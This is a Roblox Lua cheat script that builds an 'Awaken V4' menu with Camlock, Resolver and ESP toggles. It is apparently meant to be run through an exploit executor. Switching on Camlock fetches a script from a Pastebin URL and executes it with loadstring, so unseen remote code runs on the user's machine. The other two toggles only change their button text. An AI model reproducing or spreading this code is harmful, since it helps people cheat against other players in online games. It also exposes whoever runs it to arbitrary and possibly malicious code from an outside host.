local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local CamlockLabel = Instance.new("TextButton")
local ResolverLabel = Instance.new("TextButton")
local ESPLabel = Instance.new("TextButton")
local Credits = Instance.new("TextLabel")
local CloseButton = Instance.new("TextButton")
local UICornerMain = Instance.new("UICorner")
local UICornerLabels = Instance.new("UICorner")

ScreenGui.Parent = game.CoreGui

MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.Size = UDim2.new(0, 300, 0, 240)  -- Increased width to fit elements
MainFrame.Position = UDim2.new(0.5, -150, 0.5, -120)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true

UICornerMain.CornerRadius = UDim.new(0, 10)
UICornerMain.Parent = MainFrame

Title.Parent = MainFrame
Title.Text = "Awaken V4"
Title.Font = Enum.Font.SourceSans
Title.TextColor3 = Color3.fromRGB(28, 254, 253)  -- Neon light blue text color (28, 254, 253)
Title.TextScaled = true
Title.Size = UDim2.new(1, 0, 0.2, 0)  -- Increased height for bigger title
Title.Position = UDim2.new(0, 0, 0.05, 0)  -- Adjusted position slightly down
Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0

CamlockLabel.Parent = MainFrame
CamlockLabel.Text = "Camlock: Off"
CamlockLabel.Font = Enum.Font.SourceSans
CamlockLabel.TextColor3 = Color3.fromRGB(28, 254, 253)  -- Neon light blue text color (28, 254, 253)
CamlockLabel.TextScaled = true
CamlockLabel.Size = UDim2.new(0.8, 0, 0.1, 0)  -- Smaller button height
CamlockLabel.Position = UDim2.new(0.1, 0, 0.3, 0)
CamlockLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CamlockLabel.BorderSizePixel = 0

UICornerLabels.CornerRadius = UDim.new(0, 10)
UICornerLabels.Parent = CamlockLabel

ResolverLabel.Parent = MainFrame
ResolverLabel.Text = "Resolver: Off"
ResolverLabel.Font = Enum.Font.SourceSans
ResolverLabel.TextColor3 = Color3.fromRGB(28, 254, 253)  -- Neon light blue text color (28, 254, 253)
ResolverLabel.TextScaled = true
ResolverLabel.Size = UDim2.new(0.8, 0, 0.1, 0)  -- Smaller button height
ResolverLabel.Position = UDim2.new(0.1, 0, 0.45, 0)
ResolverLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ResolverLabel.BorderSizePixel = 0

UICornerLabels.Parent = ResolverLabel

ESPLabel.Parent = MainFrame
ESPLabel.Text = "ESP: Off"
ESPLabel.Font = Enum.Font.SourceSans
ESPLabel.TextColor3 = Color3.fromRGB(28, 254, 253)  -- Neon light blue text color (28, 254, 253)
ESPLabel.TextScaled = true
ESPLabel.Size = UDim2.new(0.8, 0, 0.1, 0)  -- Smaller button height
ESPLabel.Position = UDim2.new(0.1, 0, 0.6, 0)
ESPLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ESPLabel.BorderSizePixel = 0

UICornerLabels.Parent = ESPLabel

Credits.Parent = MainFrame
Credits.Text = "Credits: All credits go to Awaken"
Credits.Font = Enum.Font.SourceSans
Credits.TextColor3 = Color3.fromRGB(28, 254, 253)  -- Neon light blue text color (28, 254, 253)
Credits.TextScaled = true
Credits.Size = UDim2.new(0.8, 0, 0.1, 0)  -- Smaller text height
Credits.Position = UDim2.new(0.1, 0, 0.75, 0) -- Adjusted position above CloseButton
Credits.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Credits.BorderSizePixel = 0

CloseButton.Parent = MainFrame
CloseButton.Text = "Close"
CloseButton.Font = Enum.Font.SourceSans
CloseButton.TextColor3 = Color3.fromRGB(28, 254, 253)  -- Neon light blue text color (28, 254, 253)
CloseButton.TextScaled = true
CloseButton.Size = UDim2.new(0.8, 0, 0.1, 0)  -- Smaller button height
CloseButton.Position = UDim2.new(0.1, 0, 0.9, 0) -- Adjusted position to the bottom
CloseButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CloseButton.BorderSizePixel = 0

local UICorners = {UICornerMain, UICornerLabels}
for _, corner in ipairs(UICorners) do
    corner.CornerRadius = UDim.new(0, 10)
end

local guiOpen = true

-- Functions to handle the toggle behavior
local camlockOn = false
CamlockLabel.MouseButton1Click:Connect(function()
    camlockOn = not camlockOn
    CamlockLabel.Text = "Camlock: " .. (camlockOn and "On" or "Off")
    if camlockOn then
        loadstring(game:HttpGet("https://pastebin.com/raw/PAVRyMHy"))()
    end
end)

local resolverOn = false
ResolverLabel.MouseButton1Click:Connect(function()
    resolverOn = not resolverOn
    ResolverLabel.Text = "Resolver: " .. (resolverOn and "On" or "Off")
end)

local espOn = false
ESPLabel.MouseButton1Click:Connect(function()
    espOn = not espOn
    ESPLabel.Text = "ESP: " .. (espOn and "On" or "Off")
end)

CloseButton.MouseButton1Click:Connect(function()
    guiOpen = not guiOpen
    MainFrame.Visible = guiOpen
end)
